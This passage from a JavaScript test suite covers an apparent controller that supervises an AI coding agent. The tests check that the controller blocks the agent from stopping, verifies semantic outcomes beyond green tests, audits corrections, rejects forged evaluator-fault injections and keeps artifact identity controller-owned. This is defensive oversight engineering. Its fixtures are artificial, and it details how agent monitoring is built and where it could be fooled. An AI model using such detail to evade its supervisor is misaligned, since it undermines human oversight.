    "conservative termination retains attribution instead of inventing a replacement intervention");
  let events = h.store.events();
  assert.equal(events.filter((event) => event.type === "correction_emitted").length, 1);
  assert.equal(events.filter((event) => event.type === "boundary_paused").length, 1);
  assert.ok(events.some((event) => event.type === "semantic_judge_conservative_terminal"
    && event.supervisorBudgetExhausted === true));
  assert.ok(events.some((event) => event.type === "run_cannot_recover"
    && event.interventionId === correction.interventionId));
  assert.equal(events.some((event) => event.type === "intervention_unresolved"), false);
  const repeated = h.controller.stop({ input: {
    hook_event_name: "Stop", transcript_path: h.transcript,
  } });
  assert.equal(repeated.output.decision, "approve");
  events = h.store.events();
  assert.equal(events.filter((event) => event.type === "boundary_paused").length, 1);
  assert.equal(events.filter((event) => event.type === "correction_emitted").length, 1);
  assert.equal(h.store.readState().openInterventions.main.id, correction.interventionId);
  const finished = h.controller.finish();
  assert.equal(finished.proof.complete, false);
  assert.equal(finished.proof.interventionComplete, false);
  assert.match(finished.proof.errors.join("; "), /semantic outcome verification|causal chain/);
});

test("evaluation process-budget exhaustion terminates on the first failure without a retry loop", () => {
  const green = { ran: true, passed: true, exit: 0, command: "npm test", output: "ok" };
  let verifierCalls = 0;
  const h = harness({
    maxSupervisorCalls: 96,
    acceptanceResults: [green],
    verifierHandler: () => {
      verifierCalls += 1;
      return { ok: false, error: "CLAUDE_BUDGET_GUARD_INVOCATION_LIMIT:20",
        failure: { kind: "process", retryable: false, category: "evaluation-budget" } };
    },
  });
  const stopped = h.controller.stop({ input: {
    hook_event_name: "Stop", transcript_path: h.transcript,
  } });
  assert.equal(stopped.output.decision, "approve");
  assert.equal(verifierCalls, 1);
  const terminal = h.store.events().find((event) =>
    event.type === "semantic_judge_conservative_terminal");
  assert.equal(terminal.failureCategory, "evaluation-budget");
  assert.equal(terminal.failureRetryable, false);
  assert.equal(h.store.events().filter((event) =>
    event.type === "semantic_judge_retry_deferred").length, 0);
  assert.ok(h.store.events().some((event) => event.type === "run_cannot_recover"
    && /model-process budget exhausted/.test(event.reason)));
});

test("green tests cannot override a semantic outcome failure", () => {
  const h = harness({ outcomeVerdict: {
    passed: false,
    gaps: ["公开结果变了，但实现违反了冻结的架构约束"],
    evidence: ["diff 保留了被禁止的 shortcut"],
  } });
  const first = h.controller.stop({ input: { hook_event_name: "Stop", transcript_path: h.transcript } });
  assert.equal(first.output.decision, "block");
  applyObservedCorrection(h);
  h.controller.stop({ input: { hook_event_name: "Stop", transcript_path: h.transcript } });
  const finished = h.controller.finish();
  assert.equal(finished.acceptance.passed, true);
  assert.equal(finished.proof.complete, false);
  assert.match(finished.proof.errors.join(" "), /semantic outcome verification/);
});

test("outcome verifier refuses insufficient evidence and never fails open", () => {
  const result = verifyOutcome({
    cmd: "fake",
    contract: { ask: "build it deeply", semantic: { forbiddenShortcuts: ["literal shell"] } },
    baseline: { fingerprint: "a" },
    current: { fingerprint: "b" },
    diff: { changes: [] },
    acceptance: { ran: true, passed: true, exit: 0, output: "ok" },
    execute: () => ({ ok: true, value: {
      passed: false,
      gaps: [],
      evidence: [],
      insufficient: "没有相关源码证据",
    } }),
  });
  assert.equal(result.ok, true);
  assert.equal(result.verdict.passed, false);
  assert.match(result.verdict.insufficient, /源码/);
});

test("outcome verifier schema retry receives the prior validation failure", () => {
  let seenInput = "";
  const result = verifyOutcome({
    cmd: "fake",
    contract: { ask: "build it deeply", semantic: { successCriteria: ["exact behavior"] } },
    baseline: { fingerprint: "a" },
    current: { fingerprint: "b" },
    diff: { changes: [] },
    acceptance: { ran: true, passed: true, exit: 0, output: "ok" },
    validationFeedback: "passed=true requires gaps=[]",
    execute: ({ input }) => {
      seenInput = input;
      return { ok: true, value: { passed: true, gaps: [], evidence: ["recomputed"] } };
    },
  });
  assert.equal(result.ok, true);
  assert.match(seenInput, /上一次响应的 schema 错误/);
  assert.match(seenInput, /passed=true requires gaps=\[\]/);
});

test("non-blocking PASS audit notes are durable telemetry and never outcome gaps", () => {
  const green = { ran: true, passed: true, exit: 0, command: "npm test", output: "ok" };
  const note = "coverage could be broader, but no frozen requirement is contradicted";
  const h = harness({
    acceptanceResults: [green, green],
    outcomeAuditorHandler: () => ({ ok: true, packet: { independentlyChecked: true }, verdict: {
      decision: "pass",
      passed: true,
      blockingErrors: [],
      errors: [],
      notes: [note],
      verifiedFacts: ["the frozen behavior was recomputed"],
      insufficient: null,
    } }),
  });
  const stop = h.controller.stop({ input: {
    hook_event_name: "Stop", transcript_path: h.transcript,
  } });
  assert.equal(stop.output.decision, "approve");
  const audit = h.store.events().find((event) => event.type === "outcome_approval_audit");
  assert.equal(audit.decision, "pass");
  assert.deepEqual(audit.blockingErrors, []);
  assert.deepEqual(audit.notes, [note]);
  assert.deepEqual(audit.errors, [], "legacy blocking-error field remains compatible");
  const outcome = h.store.events().find((event) => event.type === "outcome_verdict");
  assert.equal(outcome.passed, true);
  assert.equal(outcome.gaps.includes(note), false);
  const finished = h.controller.finish();
  assert.equal(finished.proof.complete, true, finished.proof.errors.join("; "));
});

test("fresh semantic audits receive frozen evidence and the proposed authority decision", () => {
  let correctionInput = "";
  const correction = auditCorrectionProposal({
    cmd: "fake",
    contract: { ask: "exact invariant", semantic: { successCriteria: ["all sequences"] } },
    evidence: { currentSource: "implementation" },
    proposal: { onTrack: false, drift: "counterexample", plan: ["repair"] },
    execute: ({ input }) => {
      correctionInput = input;
      return { ok: true, value: { passed: true, errors: [], verifiedFacts: ["recomputed"] } };
    },
  });
  assert.equal(correction.ok, true);
  assert.match(correctionInput, /exact invariant/);
  assert.match(correctionInput, /counterexample/);

  let outcomeInput = "";
  const outcome = auditOutcomeApproval({
    cmd: "fake",
    outcomePacket: { semanticContract: { successCriteria: ["all sequences"] } },
    proposedVerdict: { passed: true, gaps: [], evidence: ["claimed proof"] },
    execute: ({ input }) => {
      outcomeInput = input;
      return { ok: true, value: { passed: false,
        errors: ["claimed proof narrows the contract"], verifiedFacts: [] } };
    },
  });
  assert.equal(outcome.ok, true);
  assert.equal(outcome.verdict.passed, false);
  assert.match(outcomeInput, /all sequences/);
  assert.match(outcomeInput, /claimed proof/);

  let clearanceInput = "";
  const clearance = auditSupervisorClearance({
    cmd: "fake",
    contract: { ask: "satisfy sealed acceptance", semantic: { successCriteria: ["green"] } },
    evidence: { trigger: "acceptance-red-at-stop", acceptance: { passed: false, exit: 1 } },
    proposal: { onTrack: true, drift: "", plan: ["still needs repair"] },
    execute: ({ input }) => {
      clearanceInput = input;
      return { ok: true, value: { passed: false,
        errors: ["red acceptance contradicts silent clearance"], verifiedFacts: [] } };
    },
  });
  assert.equal(clearance.ok, true);
  assert.equal(clearance.verdict.passed, false);
  assert.match(clearanceInput, /acceptance-red-at-stop/);
  assert.match(clearanceInput, /still needs repair/);
});

test("an independently green baseline is a valid idempotent no-op, not an edit livelock", () => {
  const green = { ran: true, passed: true, exit: 0, command: "npm test", output: "all green" };
  const h = harness({
    acceptanceResults: [green, green],
    verifierHandler: () => { throw new Error("Stop verifier must reuse baseline attestation"); },
  });
  h.store.append("baseline_acceptance", green);
  h.store.append("baseline_outcome_approval_audit", {
    passed: true,
    baselineFingerprint: h.store.readJson("baseline.json").fingerprint,
    errors: [],
    verifiedFacts: ["baseline PASS independently checked"],
  });
  h.store.append("baseline_outcome_verdict", {
    checked: true,
    passed: true,
    gaps: [],
    evidence: ["baseline source already implements the frozen contract"],
    insufficient: null,
    baselineFingerprint: h.store.readJson("baseline.json").fingerprint,
    acceptancePassed: true,
  });
  const stopped = h.controller.stop({ input: {
    hook_event_name: "Stop", transcript_path: h.transcript,
  } });
  assert.equal(stopped.output.decision, "approve");
  const outcome = h.store.events().find((event) => event.type === "outcome_verdict"
    && event.phase === "stop");
  assert.equal(outcome.passed, true);
  assert.equal(outcome.source, "baseline-outcome-attestation");
  assert.equal(h.store.events().some((event) => event.type === "outcome_verifier_requested"), false);
  assert.equal(h.store.events().some((event) => event.type === "correction_emitted"), false);
});

test("outcome and patrol evidence distinguish inspected-no-change from never inspected", () => {
  const contract = { ask: "keep value correct", acceptance: "npm test", semantic: {
    successCriteria: ["src/value.js exports the correct value"],
    scope: { in: ["src/value.js"], out: [] },
  } };
  const snapshot = { fingerprint: "same", files: {
    "src/value.js": { text: "export const value = 2;", sha: "x", size: 23 },
    "test/value.test.js": { text: "assert.equal(value, 2);", sha: "t", size: 23 },
    "package.json": { text: JSON.stringify({ scripts: { test: "node --test" } }),
      sha: "p", size: 39 },
  } };
  const patrol = supervisorPacket({
    contract,
    steps: [
      { toolName: "Read", file: "src/value.js", isEdit: false },
      { toolName: "Grep", file: "src/value.js", isEdit: false },
      { uid: "test-1", toolName: "Bash", action: "npm test", isTest: true, exit: 1 },
      { uid: "edit-1", toolName: "Edit", action: "Edit(src/value.js)",
        file: "src/value.js", isEdit: true, exit: 0 },
    ],
    diff: { changed: 0, changes: [] },
    baselineAcceptance: { ran: true, passed: true, exit: 0, command: "npm test" },
    baselineSnapshot: snapshot,
  });
  assert.equal(patrol.reads, 2);
  assert.deepEqual(patrol.filesRead, ["src/value.js"]);
  assert.equal(patrol.baselineAcceptance.passed, true);
  assert.deepEqual(patrol.trajectory.map((step) => step.action).slice(-2),
    ["npm test", "Edit(src/value.js)"]);
  assert.equal(patrol.frozenAcceptanceDefinition.packageScripts.test, "node --test");
  assert.equal(patrol.frozenAcceptanceDefinition.files.some((file) =>
    file.path === "test/value.test.js" && file.content.includes("value, 2")), true);
  assert.equal(patrol.currentSourceEvidence[0].path, "src/value.js");
  assert.match(patrol.currentSourceEvidence[0].content, /value = 2/);
  const outcome = outcomePacket({
    contract,
    baseline: snapshot,
    current: snapshot,
    diff: { changed: 0, changes: [] },
    acceptance: { ran: true, passed: true, exit: 0, command: "npm test", output: "green" },
    baselineAcceptance: { ran: true, passed: true, exit: 0, command: "npm test" },
    phase: "baseline",
    executionSteps: [
      { uid: "t1", agentId: "teammate:store-owner", toolName: "Bash",
        action: "npm test", isTest: true, exit: 1 },
      { uid: "t2", toolName: "Bash", action: "npm test", isTest: true, exit: 1 },
      { uid: "t3", toolName: "Bash", action: "npm test", isTest: true, exit: 1 },
      { uid: "e1", toolName: "Edit", action: "Edit(src/value.js)",
        file: "src/value.js", isEdit: true, exit: 0 },
    ],
    controllerProcessEvidence: [
      { seq: 8, type: "endurance_shift_dispatched", ordinal: 1,
        afterApprovedStopSeq: 7 },
    ],
  });
  assert.equal(outcome.evaluationPhase, "baseline");
  assert.equal(outcome.currentSourceEvidence[0].path, "src/value.js");
  assert.match(outcome.currentSourceEvidence[0].content, /value = 2/);
  assert.deepEqual(outcome.executionEvidence.slice(0, 3).map((step) => step.action),
    ["npm test", "npm test", "npm test"]);
  assert.equal(outcome.executionEvidence[0].agentId, "teammate:store-owner");
  assert.deepEqual(outcome.controllerProcessEvidence, [
    { seq: 8, type: "endurance_shift_dispatched", ordinal: 1,
      afterApprovedStopSeq: 7 },
  ]);
  assert.equal(outcome.frozenAcceptanceDefinition.files.some((file) =>
    file.path === "test/value.test.js"), true);
});

test("outcome evidence is content-addressed without losing semantic bodies or failed outputs", () => {
  const sha = (digit) => `sha256:${digit.repeat(64)}`;
  const currentSourceEvidence = [
    { path: "src/value.js", sha256: sha("2"), content: "export const value = 2;" },
    { path: "test/value.test.js", sha256: sha("3"),
      content: "assert.equal(value, 2);" },
  ];
  const packet = compactOutcomePacket({
    currentSourceEvidence,
    frozenAcceptanceDefinition: { files: [
      { path: "test/value.test.js", sha256: sha("3"), sha: sha("3"),
        content: "assert.equal(value, 2);", status: "unchanged" },
    ] },
    diff: { changed: 1, changes: [
      { path: "src/value.js", status: "modified", beforeSha: sha("1"),
        afterSha: sha("2"), before: "export const value = 1;",
        after: "export const value = 2;" },
    ] },
    executionEvidence: [
      { ordinal: 1, uid: "read", tool: "Read", file: "src/value.js", isRead: true,
        exit: 0, observationHash: sha("4"), observationTail: "duplicate source body",
        agentId: null },
      { ordinal: 2, uid: "test", tool: "Bash", action: "npm test", isTest: true,
        exit: 1, observationHash: sha("5"), observationTail: "expected 2, got 1" },
    ],
    controllerProcessEvidence: [
      { seq: 7, type: "acceptance_finished", passed: false, exit: 1,
        interventionId: null, outputTail: "sealed assertion failed" },
    ],
  });
  assert.equal(packet.frozenAcceptanceDefinition.files[0].content, undefined);
  assert.equal(packet.frozenAcceptanceDefinition.files[0].contentRef,
    "currentSourceEvidence");
  assert.equal(packet.currentSourceEvidence[1].content, "assert.equal(value, 2);");
  assert.equal(packet.diff.changes[0].after, undefined);
  assert.equal(packet.diff.changes[0].afterRef, "currentSourceEvidence");
  assert.equal(packet.diff.changes[0].before, "export const value = 1;");
  assert.equal(packet.executionEvidence[0].observationTail, undefined);
  assert.equal(packet.executionEvidence[0].observationHash, sha("4"));
  assert.equal(packet.executionEvidence[1].observationTail, "expected 2, got 1");
  assert.equal("interventionId" in packet.controllerProcessEvidence[0], false);
  assert.equal(packet.controllerProcessEvidence[0].outputTail, "sealed assertion failed");
});

test("content-addressed outcome projection keeps unmatched frozen and diff bodies", () => {
  const packet = compactOutcomePacket({
    currentSourceEvidence: [{ path: "src/value.js", sha256: "after-current",
      content: "export const value = 3;" }],
    frozenAcceptanceDefinition: { files: [{ path: "test/hidden.test.js",
      sha256: "frozen-test", content: "assert.equal(value, 2);" }] },
    diff: { changed: 1, changes: [{ path: "src/value.js", afterSha: "after-packet",
      after: "export const value = 2;" }] },
    executionEvidence: [], controllerProcessEvidence: [],
  });
  assert.equal(packet.frozenAcceptanceDefinition.files[0].content,
    "assert.equal(value, 2);");
  assert.equal(packet.diff.changes[0].after, "export const value = 2;");
});

test("shell reads and frozen acceptance status are explicit evidence, not missing fields", () => {
  const contract = { ask: "inspect then fix", acceptance: "npm test" };
  const baseline = { fingerprint: "before", files: {
    "src/value.js": { text: "export const value = 1;", sha: "source-before" },
    "test/value.test.js": { text: "assert.equal(value, 2);", sha: "test-frozen" },
    "package.json": { text: JSON.stringify({ scripts: { test: "node --test" } }), sha: "package-frozen" },
  } };
  const current = { fingerprint: "after", files: {
    ...baseline.files,
    "src/value.js": { text: "export const value = 2;", sha: "source-after" },
  } };
  const packet = supervisorPacket({
    contract,
    steps: [{ uid: "shell-read", toolName: "Bash",
      action: "cat package.json; cat -n src/value.js; grep value test/value.test.js",
      executed: true, exit: 0, observation: "captured source and assertion output" }],
    baselineSnapshot: baseline,
    currentSnapshot: current,
  });
  assert.equal(packet.reads, 1);
  assert.deepEqual(new Set(packet.filesRead),
    new Set(["package.json", "src/value.js", "test/value.test.js"]));
  assert.equal(packet.readEvidence[0].source, "shell-command");
  assert.match(packet.trajectory[0].observationHash, /^sha256:[a-f0-9]{64}$/);
  assert.equal(packet.trajectory[0].observationTail, "captured source and assertion output");
  const testDefinition = packet.frozenAcceptanceDefinition.files
    .find((file) => file.path === "test/value.test.js");
  assert.equal(testDefinition.sha256, "test-frozen");
  assert.equal(testDefinition.currentSha256, "test-frozen");
  assert.equal(testDefinition.status, "unchanged");
  assert.equal(testDefinition.changed, false);
});

test("Cowork sandbox command paths cannot override controller-owned artifact identity", () => {
  const contract = { ask: "fix the ledger", acceptance: "npm test", semantic: {
    successCriteria: ["tenant balances remain isolated"],
    scope: { in: ["src/ledger.js"], out: [] },
  } };
  const baseline = { fingerprint: "sha256:baseline", files: {
    "src/ledger.js": { text: "export const ledger = new Map();", sha: "source-before" },
    "test.mjs": { text: "// frozen assertions", sha: "test-frozen" },
    "package.json": { text: JSON.stringify({ scripts: { test: "node test.mjs" } }),
      sha: "package-frozen" },
  } };
  const current = { fingerprint: "sha256:current", files: {
    ...baseline.files,
    "src/ledger.js": { text: "export const ledger = new Map([[\"tenant\", 1]]);",
      sha: "source-current" },
  } };
  const canonicalCwd = "/Users/operator/selected/repository";
  const packet = supervisorPacket({
    contract,
    steps: [{ uid: "bash-1", toolName: "Bash",
      action: "cd /sessions/worker/mnt/repository && npm test",
      executed: true, exit: 1, observation: "tenant isolation failed" }],
    baselineSnapshot: baseline,
    currentSnapshot: current,
    acceptance: { command: "npm test", ran: true, passed: false, exit: 1,
      output: "tenant isolation failed" },
    semanticOutcome: { checked: true, passed: false,
      gaps: ["tenant identity is collapsed"], evidence: ["hostile tenant probe failed"] },
    workspaceIdentity: {
      schema: "outsider/workspace-identity/v1",
      canonicalCwd,
      workspaceRoot: "/Users/operator/selected",
      resolutionSource: "claude-desktop:userSelectedFolders",
      refinementSource: "operator-path:repository-owned-acceptance",
      identityHash: "sha256:workspace",
      sandboxPathAlias: { status: "not-asserted", aliases: [] },
    },
  });
  assert.equal(packet.workspaceEvidence.canonicalArtifact.authority, "controller-owned");
  assert.equal(packet.workspaceEvidence.canonicalArtifact.cwd, canonicalCwd);
  assert.equal(packet.workspaceEvidence.canonicalArtifact.snapshotFingerprint, "sha256:current");
  assert.equal(packet.workspaceEvidence.canonicalArtifact.acceptance.executor, "controller");
  assert.equal(packet.workspaceEvidence.executionTelemetry.authoritativeForArtifactIdentity, false);
  assert.equal(packet.workspaceEvidence.executionTelemetry.sandboxPathAlias.status, "not-asserted");
  assert.match(packet.trajectory[0].action, /^cd \/sessions\//,
    "the original sandbox path remains available as non-authoritative telemetry");
});

test("controlled acceptance cannot turn a failed pipeline green", {
  skip: process.platform === "win32",
}, () => {
  const result = runAcceptance({ cwd: process.cwd(), command: "false | tail -1" });
  assert.equal(result.ran, true);
  assert.equal(result.exit, 1);
  assert.equal(result.passed, false);
});

test("final semantic verification receives the durable ordered tool timeline", () => {
  const green = { ran: true, passed: true, exit: 0, command: "npm test", output: "green" };
  let inspected = null;
  let factualAuditSeq = null;
  let observedSeq = null;
  const h = harness({
    acceptanceResults: [green],
    decide: ({ toolName, toolInput }) => ({ verdict: "allow", proposed: {
      action: toolName === "Bash" ? toolInput.command : `${toolName}(${toolInput.file_path})`,
      toolName,
      file: toolInput.file_path ?? null,
      isTest: toolName === "Bash" && toolInput.command === "npm test",
      isEdit: toolName === "Edit",
      irreversible: false,
    } }),
    verifierHandler: (options) => {
      inspected = options.executionSteps;
      assert.equal(options.controllerProcessEvidence.some((event) =>
        event.type === "endurance_shift_dispatched" && event.ordinal === 1), true);
      assert.equal(options.controllerProcessEvidence.some((event) =>
        event.type === "team_task_created" && event.taskId === "slice-1"
        && event.owner === "store-owner"), true);
      assert.equal(options.controllerProcessEvidence.some((event) =>
        event.type === "confirmed_file_touch" && event.agentId === "teammate:store-owner"
        && event.file === "src/value.js" && event.changed === true), true);
      const red = options.controllerProcessEvidence.find((event) =>
        event.type === "acceptance_finished" && event.passed === false);
      assert.equal(red.ran, true);
      assert.equal(red.exit, 1);
      assert.equal(red.acceptanceMatchesCurrentCommand, true);
      assert.match(red.outputTail, /sealed marker failed/);
      const emitted = options.controllerProcessEvidence.find((event) =>
        event.type === "correction_emitted" && event.interventionId === "repair-1");
      assert.equal(emitted.correctionAuthorityHash, "sha256:authority-1");
      assert.equal(emitted.factualAuditSeq, factualAuditSeq);
      assert.deepEqual(emitted.expectedActions, [
        { kind: "delete", path: ".outsider-endurance-drift",
          preSha256: "sha256:marker", ref: null, expectExit: null },
        { kind: "runRef", path: null, preSha256: null,
          ref: "frozenAcceptance", expectExit: 0 },
      ]);
      assert.equal(options.controllerProcessEvidence.some((event) =>
        event.type === "correction_observed" && event.correctionObserved === true
        && event.correctionAuthorityHash === "sha256:authority-1"), true);
      assert.equal(options.controllerProcessEvidence.some((event) =>
        event.type === "effect_observed" && event.afterCorrectionSeq === observedSeq
        && event.changedFiles?.[0] === ".outsider-endurance-drift"), true);
      return { ok: true, verdict: { passed: true, gaps: [], evidence: ["ordered actions verified"] },
        packet: outcomePacket({ ...options, executionSteps: options.executionSteps,
          controllerProcessEvidence: options.controllerProcessEvidence }) };
    },
  });
  h.store.append("endurance_shift_dispatched", {
    kind: "checkpoint", ordinal: 1, afterApprovedStopSeq: 0,
  });
  h.store.append("team_task_created", {
    taskId: "slice-1", owner: "store-owner", status: "pending", blockedBy: [],
  });
  h.store.append("confirmed_file_touch", {
    agentId: "teammate:store-owner", file: "src/value.js", taskIds: ["slice-1"],
    changed: true, executed: true, toolUseId: "team-edit-1",
  });
  h.store.append("acceptance_finished", {
    interventionId: null, phase: "stop", ran: true, passed: false, exit: 1,
    command: "npm test", finalFingerprint: "sha256:red",
    outputTail: "sealed marker failed", outputHash: "sha256:red-output",
  });
  h.store.append("boundary_paused", {
    interventionId: "repair-1", boundary: "Stop", trigger: "acceptance-red-at-stop",
    agentId: "main", attempt: 1,
  });
  h.store.append("supervisor_verdict", {
    interventionId: "repair-1", onTrack: false, source: "diagnosis",
    correctionAuthorityHash: "sha256:authority-1",
  });
  const factualAudit = h.store.append("correction_factual_audit", {
    interventionId: "repair-1", passed: true, decision: "pass",
    correctionAuthorityHash: "sha256:authority-1",
  });
  factualAuditSeq = factualAudit.seq;
  h.store.append("correction_emitted", {
    interventionId: "repair-1", correctionAuthorityHash: "sha256:authority-1",
    factualAuditSeq: factualAudit.seq,
    expectedActions: [
      { kind: "delete", path: ".outsider-endurance-drift", preSha256: "sha256:marker" },
      { kind: "runRef", ref: "frozenAcceptance", expectExit: 0 },
    ],
  });
  const observed = h.store.append("correction_observed", {
    interventionId: "repair-1", correctionAuthorityHash: "sha256:authority-1",
  });
  observedSeq = observed.seq;
  h.store.append("effect_observed", {
    interventionId: "repair-1", correctionAuthorityHash: "sha256:authority-1",
    afterCorrectionSeq: observed.seq, changedFiles: [".outsider-endurance-drift"],
    effectKind: "workspace-diff",
  });
  for (let index = 1; index <= 3; index += 1) {
    const input = {
      hook_event_name: "PreToolUse", tool_name: "Bash", tool_use_id: `test-${index}`,
      tool_input: { command: "npm test" }, transcript_path: h.transcript,
    };
    h.controller.preTool({ input });
    h.controller.postTool({ input: { ...input, hook_event_name: "PostToolUse",
      tool_response: { exit_code: 1 } } });
  }
  const editInput = {
    hook_event_name: "PreToolUse", tool_name: "Edit", tool_use_id: "edit-1",
    tool_input: { file_path: "src/value.js" }, transcript_path: h.transcript,
  };
  h.controller.preTool({ input: editInput });
  h.controller.postTool({ input: { ...editInput, hook_event_name: "PostToolUse" } });
  const stopped = h.controller.stop({ input: {
    hook_event_name: "Stop", transcript_path: h.transcript,
  } });
  assert.equal(stopped.output.decision, "approve");
  assert.deepEqual(inspected.slice(0, 4).map((step) => step.action),
    ["npm test", "npm test", "npm test", "Edit(src/value.js)"]);
  const verdict = h.store.events().find((event) => event.type === "outcome_verdict");
  assert.ok(verdict.evidenceFile);
  const packet = h.store.readJson(verdict.evidenceFile);
  assert.deepEqual(packet.executionEvidence.slice(0, 4).map((step) => step.action),
    ["npm test", "npm test", "npm test", "Edit(src/value.js)"]);
  assert.equal(packet.controllerProcessEvidence.some((event) =>
    event.type === "endurance_shift_dispatched" && event.ordinal === 1), true);
});

test("diagnosis receives controller-owned endurance injection provenance", () => {
  let captured = null;
  const h = harness({
    decide: () => ({ verdict: "allow", proposed: { action: "Read(src/value.js)",
      toolName: "Read", file: "src/value.js", isEdit: false, isTest: false,
      irreversible: false } }),
    supervisorHandler: ({ packet }) => {
      captured = packet.controllerProcessEvidence;
      return { ok: true, verdict: { onTrack: true, drift: "", plan: [] } };
    },
  });
  h.store.append("endurance_recovery_drill_injected", {
    path: ".outsider-endurance-drift", contentHash: "sha256:drill",
    evaluatorOwned: true, controllerPreparedBeforeHook: true, armedEventSeq: 8,
  });
  h.controller.supervise({
    input: { hook_event_name: "PreToolUse", tool_name: "Read",
      tool_input: { file_path: "src/value.js" } },
    agent: "claude-code", boundary: "PreToolUse", trigger: "test",
    actor: { agentId: "main" },
  });
  assert.equal(captured.length, 1);
  assert.deepEqual(captured[0], {
    seq: captured[0].seq,
    at: captured[0].at,
    type: "endurance_recovery_drill_injected",
    kind: null,
    ordinal: null,
    afterApprovedStopSeq: null,
    dispatchedAtSeq: null,
    armedEventSeq: 8,
    path: ".outsider-endurance-drift",
    contentHash: "sha256:drill",
    evaluatorOwned: true,
    controllerPreparedBeforeHook: true,
    logicalTarget: null,
    sourceHash: null,
    markerHash: null,
    beforeHash: null,
    afterHash: null,
    faultAuthorityHash: null,
    taskId: null,
    generation: null,
    agentId: null,
    parentAgentId: null,
    description: null,
    promptVisibility: null,
    promptHash: null,
    owner: null,
    status: null,
    blockedBy: null,
    file: null,
    changed: null,
    executed: null,
    reportHash: null,
    reportBytes: null,
    transcriptBound: null,
    independentlyVerified: null,
    taskIds: null,
    toolUseId: null,
    identityBindingHash: null,
  });
});

test("a registered evaluator fault is sealed into semantic evidence without granting worker authority", () => {
  const sourceHash = `sha256:${"a".repeat(64)}`;
  let captured = null;
  const h = harness({
    allowedEvaluatorFaultSourceHash: sourceHash,
    supervisorHandler: ({ packet }) => {
      captured = packet.controllerProcessEvidence;
      return { ok: true, verdict: { onTrack: true, drift: "", plan: [] } };
    },
  });
  const evaluatorFault = {
    schema: "outsider/evaluator-fault/v1",
    kind: "r3-integration-drift",
    evaluatorOwned: true,
    sourceHash,
    markerHash: `sha256:${"b".repeat(64)}`,
    logicalTarget: "src/index.js",
    beforeHash: `sha256:${"c".repeat(64)}`,
    afterHash: `sha256:${"d".repeat(64)}`,
  };
  h.controller.handleHook({ input: {
    hook_event_name: "PreToolUse", tool_name: "Read", tool_use_id: "fault-boundary",
    tool_input: { file_path: "src/value.js" },
    _outsider_evaluator_fault: evaluatorFault,
  } });
  h.controller.supervise({ input: { hook_event_name: "PreToolUse", tool_name: "Read",
    tool_input: { file_path: "src/value.js" } }, boundary: "PreToolUse", trigger: "test",
  actor: { agentId: "main" } });
  const event = h.store.events().find((candidate) =>
    candidate.type === "evaluator_fault_injected");
  assert.ok(event?.faultAuthorityHash);
  assert.equal(event.evaluatorOwned, true);
  assert.equal(event.beforeHash, evaluatorFault.beforeHash);
  assert.equal(event.afterHash, evaluatorFault.afterHash);
  assert.equal(captured.some((candidate) => candidate.type === "evaluator_fault_injected"
    && candidate.faultAuthorityHash === event.faultAuthorityHash), true);

  h.controller.handleHook({ input: {
    hook_event_name: "PreToolUse", tool_name: "Read", tool_use_id: "forged-boundary",
    tool_input: { file_path: "src/value.js" },
    _outsider_evaluator_fault: { ...evaluatorFault,
      sourceHash: `sha256:${"e".repeat(64)}` },
  } });
  assert.equal(h.store.events().filter((candidate) =>
    candidate.type === "evaluator_fault_injected").length, 1);
  assert.equal(h.store.events().some((candidate) =>
    candidate.type === "evaluator_fault_rejected"), true);
});

test("host-paired results missing from controller PostTool events still sort before a later edit", () => {
  const green = { ran: true, passed: true, exit: 0, command: "npm test", output: "green" };
  let inspected = null;
  const h = harness({
    acceptanceResults: [green],
    decide: ({ toolName, toolInput }) => ({ verdict: "allow", proposed: {
      action: toolName === "Edit" ? `Edit(${toolInput.file_path})` : toolName,
      toolName, file: toolInput.file_path ?? null, isEdit: toolName === "Edit",
      isTest: false, irreversible: false,
    } }),
    verifierHandler: (options) => {
      inspected = options.executionSteps;
      return { ok: true, verdict: { passed: true, gaps: [], evidence: ["ordered"] },
        packet: outcomePacket({ ...options, executionSteps: options.executionSteps }) };
    },
  });
  const lines = [];
  for (let index = 1; index <= 3; index += 1) {
    const uid = `transcript-test-${index}`;
    lines.push(JSON.stringify({ timestamp: `2026-08-05T00:00:0${index}Z`,
      message: { content: [{ type: "tool_use", id: uid, name: "Bash",
        input: { command: "npm test" } }] } }));
    lines.push(JSON.stringify({ timestamp: `2026-08-05T00:00:1${index}Z`,
      message: { content: [{ type: "tool_result", tool_use_id: uid,
        is_error: true, content: "tests failed" }] } }));
  }
  writeFileSync(h.transcript, `${lines.join("\n")}\n`);
  const edit = { hook_event_name: "PreToolUse", tool_name: "Edit", tool_use_id: "later-edit",
    tool_input: { file_path: "src/value.js" }, transcript_path: h.transcript };
  h.controller.preTool({ input: edit });
  h.controller.postTool({ input: { ...edit, hook_event_name: "PostToolUse" } });
  const stopped = h.controller.stop({ input: {
    hook_event_name: "Stop", transcript_path: h.transcript,
  } });
  assert.equal(stopped.output.decision, "approve");
  assert.deepEqual(inspected.slice(0, 4).map((step) => step.uid),
    ["transcript-test-1", "transcript-test-2", "transcript-test-3", "later-edit"]);
  assert.deepEqual(inspected.slice(0, 4).map((step) => step.executed),
    [true, true, true, true]);
  const verdict = h.store.events().find((event) => event.type === "outcome_verdict");
  const packet = h.store.readJson(verdict.evidenceFile);
  assert.deepEqual(packet.executionEvidence.slice(0, 4).map((step) => step.ordinal), [1, 2, 3, 4]);
  assert.deepEqual(packet.executionEvidence.slice(0, 4).map((step) => step.executed),
    [true, true, true, true]);
});

test("a transient diagnosis failure retries once inside the global supervisor budget", () => {
  const red = { ran: true, passed: false, exit: 1, command: "npm test", output: "red" };
  let attempts = 0;
  const h = harness({
    acceptanceResults: [red],
    supervisorHandler: () => {
      attempts += 1;
      if (attempts === 1) return { ok: false, error: "Execution error",
        failure: { kind: "process", status: 1, retryable: true } };
      return { ok: true, verdict: { onTrack: false, drift: "implementation is shallow",
        plan: ["replace it with the contract mechanism"],
        expectedNextActions: ["edit:src/value.js"], acceptanceRisk: "red" } };
    },
  });
  const stopped = h.controller.stop({ input: {
    hook_event_name: "Stop", transcript_path: h.transcript,
  } });
  assert.equal(stopped.output.decision, "block");
  assert.equal(attempts, 2);
  const events = h.store.events();
  assert.equal(events.filter((event) => event.type === "supervisor_call_reserved").length, 3,
    "two diagnosis attempts plus one independent correction audit");
  assert.ok(events.some((event) => event.type === "supervisor_retrying"
    && event.exitStatus === 1 && event.retryable === true));
  assert.equal(events.some((event) => event.type === "supervisor_failed"), false);
  assert.ok(events.some((event) => event.type === "correction_emitted"));
});

test("a transient outcome-verifier failure retries before Stop can release", () => {
  const green = { ran: true, passed: true, exit: 0, command: "npm test", output: "green" };
  let attempts = 0;
  const h = harness({
    acceptanceResults: [green],
